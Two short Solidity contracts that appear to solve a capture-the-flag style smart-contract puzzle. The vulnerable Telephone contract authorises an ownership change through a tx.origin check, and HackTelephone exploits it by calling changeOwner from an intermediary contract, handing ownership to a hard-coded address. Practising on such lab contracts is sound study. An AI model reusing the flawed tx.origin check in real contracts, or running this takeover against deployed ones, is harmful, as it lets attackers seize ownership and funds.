// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import './Telephone.sol';

contract HackTelephone {

  Telephone public originalContract = Telephone(0xc7Bc7aaa3fAde3d6963D07F88aB0185202F40194); 

  function changeOwner() public {
    originalContract.changeOwner(0x68fB1897b169446968A7c2128D5025c387d14cC0);
  }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}